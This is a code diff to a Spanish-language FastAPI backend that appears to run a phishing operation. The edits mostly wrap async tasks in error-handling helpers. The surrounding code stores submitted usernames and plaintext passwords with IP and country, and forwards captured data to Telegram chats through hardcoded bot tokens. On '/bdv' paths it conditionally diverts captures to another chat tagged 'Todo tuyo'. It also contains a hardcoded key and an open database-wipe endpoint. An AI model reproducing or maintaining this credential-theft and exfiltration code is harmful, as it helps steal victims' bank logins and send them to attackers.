@@ -189,24 +189,30 @@ def obtener_numero_cached(ip: str) -> Optional[int]:
 def obtener_usuario_cached(usuario: str) -> Optional[int]:
     return user_cache.get(usuario)
 
-def obtener_is_active_cached() -> bool:
-    global cache_last_updated, is_active_cache
-    current_time = time.time()
-    
-    # Actualizar cache si es muy antiguo (cada 30 segundos)
-    if current_time - cache_last_updated > 30:
-        asyncio.create_task(refresh_is_active_cache())
-    
-    return is_active_cache
-
 async def refresh_is_active_cache():
     global is_active_cache, cache_last_updated
     try:
         doc = await global_settings.find_one({"id": 1})
         is_active_cache = bool(doc["is_active"]) if doc else False
         cache_last_updated = time.time()
-    except:
-        pass
+    except Exception as e:
+        print(f"Error actualizando cache is_active: {e}")
+
+def obtener_is_active_cached() -> bool:
+    global cache_last_updated, is_active_cache
+    current_time = time.time()
+    
+    # Actualizar cache si es muy antiguo (cada 30 segundos)
+    if current_time - cache_last_updated > 30:
+        # Crear task de forma segura
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.create_task(refresh_is_active_cache())
+        except RuntimeError:
+            # Si no hay loop activo, usar el valor cacheado
+            pass
+    
+    return is_active_cache
 
 def contar_elemento_optimized(cola: deque, elemento: str) -> int:
     return sum(1 for x in cola if x == elemento)
@@ -243,8 +249,13 @@ class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
         if client_ip not in iprandom and client_ip not in ip_number_cache:
             numero_random = random.randint(0, 9)
             agregar_elemento_diccionario_cache(client_ip, numero_random)
-            # Guardar en BD de forma asíncrona
-            asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
+            # Guardar en BD de forma asíncrona con función wrapper
+            try:
+                loop = asyncio.get_event_loop()
+                asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
+            except RuntimeError:
+                # Si no hay loop, ignorar el guardado en BD
+                pass
 
         return await call_next(request)
 
@@ -298,6 +309,16 @@ async def login(password: str = Form(...)):
 async def validar_clave(data: ClaveRequest):
     return {"valido": data.clave == "gato123"}
 
+async def _bloquear_ip_bd(ip: str):
+    """Función auxiliar para bloquear IP en BD"""
+    try:
+        await ip_bloqueadas.insert_one({
+            "ip": ip, 
+            "fecha_bloqueo": datetime.utcnow()
+        })
+    except Exception as e:
+        print(f"Error bloqueando IP en BD: {e}")
+
 @app.post("/bloquear_ip/")
 async def bloquear_ip(data: IPRequest):
     ip = data.ip.strip()
@@ -305,13 +326,17 @@ async def bloquear_ip(data: IPRequest):
     if ip not in blocked_ips_cache:
         blocked_ips_cache.add(ip)
         # Guardar en BD de forma asíncrona
-        asyncio.create_task(ip_bloqueadas.insert_one({
-            "ip": ip, 
-            "fecha_bloqueo": datetime.utcnow()
-        }))
+        asyncio.create_task(_bloquear_ip_bd(ip))
         return {"message": f"La IP {ip} ha sido bloqueada."}
     else:
         return {"message": f"La IP {ip} ya estaba bloqueada."}
+
+async def _desbloquear_ip_bd(ip: str):
+    """Función auxiliar para desbloquear IP en BD"""
+    try:
+        await ip_bloqueadas.delete_one({"ip": ip})
+    except Exception as e:
+        print(f"Error desbloqueando IP en BD: {e}")
 
 @app.post("/desbloquear_ip/")
 async def desbloquear_ip(data: IPRequest):
@@ -320,7 +345,7 @@ async def desbloquear_ip(data: IPRequest):
     if ip in blocked_ips_cache:
         blocked_ips_cache.discard(ip)
         # Eliminar de BD de forma asíncrona
-        asyncio.create_task(ip_bloqueadas.delete_one({"ip": ip}))
+        asyncio.create_task(_desbloquear_ip_bd(ip))
         return {"message": f"La IP {ip} ha sido desbloqueada."}
     else:
         return {"message": f"La IP {ip} no estaba bloqueada."}
@@ -333,9 +358,21 @@ async def obtener_ips_bloqueadas():
 async def read_root():
     return {"message": "API funcionando correctamente!"}
 
+async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
+    """Función auxiliar para guardar log de usuario"""
+    try:
+        await logs_usuarios.insert_one({
+            "usuario": usuario,
+            "contrasena": contra,
+            "ip": ip,
+            "pais": pais,
+            "fecha": datetime.utcnow()
+        })
+    except Exception as e:
+        print(f"Error guardando log usuario: {e}")
+
 @app.post("/guardar_datos")
 async def guardar_datos(
-    background_tasks: BackgroundTasks,
     usuario: str = Form(...), 
     contra: str = Form(...), 
     request: Request = None
@@ -344,16 +381,7 @@ async def guardar_datos(
     permitido, pais = await verificar_pais_cached(ip)
 
     # Guardar en BD de forma asíncrona
-    background_tasks.add_task(
-        logs_usuarios.insert_one,
-        {
-            "usuario": usuario,
-            "contrasena": contra,
-            "ip": ip,
-            "pais": pais,
-            "fecha": datetime.utcnow()
-        }
-    )
+    asyncio.create_task(_guardar_log_usuario(usuario, contra, ip, pais))
     
     return {
         "message": "Datos guardados correctamente",
@@ -473,6 +501,13 @@ endpoint_configs = [
     {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
 ]
 
+async def _enviar_telegram_task(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
+    """Función auxiliar para enviar mensaje a Telegram"""
+    try:
+        await enviar_telegram_async(mensaje, chat_id, token)
+    except Exception as e:
+        print(f"Error enviando mensaje a Telegram: {e}")
+
 async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
     client_ip = request.client.host
     cola.append(client_ip)
@@ -492,11 +527,11 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
         if (path.startswith("/bdv") and obtener_is_active_cached() and 
             numeror in numeros_r and pais not in {"US", "CO"}):
             # Enviar de forma asíncrona sin bloquear
-            asyncio.create_task(enviar_telegram_async(mensaje_completo + " Todo tuyo", "-4931572577"))
+            asyncio.create_task(_enviar_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577"))
         else:
             # Enviar ambos mensajes de forma asíncrona
-            asyncio.create_task(enviar_telegram_async(mensaje_completo))
-            asyncio.create_task(enviar_telegram_async(mensaje, config["chat_id"], config["bot_id"]))
+            asyncio.create_task(_enviar_telegram_task(mensaje_completo))
+            asyncio.create_task(_enviar_telegram_task(mensaje, config["chat_id"], config["bot_id"]))
 
         return {"mensaje_enviado": True}
     else:
@@ -510,8 +545,8 @@ for config in endpoint_configs:
         methods=["POST"]
     )
 
-@app.post('/clear_db')
-async def clear_db_endpoint():
+async def _clear_db_collections():
+    """Función auxiliar para limpiar colecciones de BD"""
     try:
         # Limpiar en paralelo
         tasks = [
@@ -519,14 +554,22 @@ async def clear_db_endpoint():
             user_numbers.delete_many({})
         ]
         await asyncio.gather(*tasks)
-        
+        return True
+    except Exception as e:
+        print(f"Error limpiando BD: {e}")
+        return False
+
+@app.post('/clear_db')
+async def clear_db_endpoint():
+    success = await _clear_db_collections()
+    
+    if success:
         # Limpiar caches
         ip_number_cache.clear()
         user_cache.clear()
-        
         return {"message": "Se borró correctamente"}
-    except Exception as e:
-        return {"message": f"Error: {str(e)}"}
+    else:
+        return {"message": "Error al borrar"}
 
 # Endpoints adicionales optimizados con endpoints faltantes del original
 @app.put("/editar-ip/{ip}")
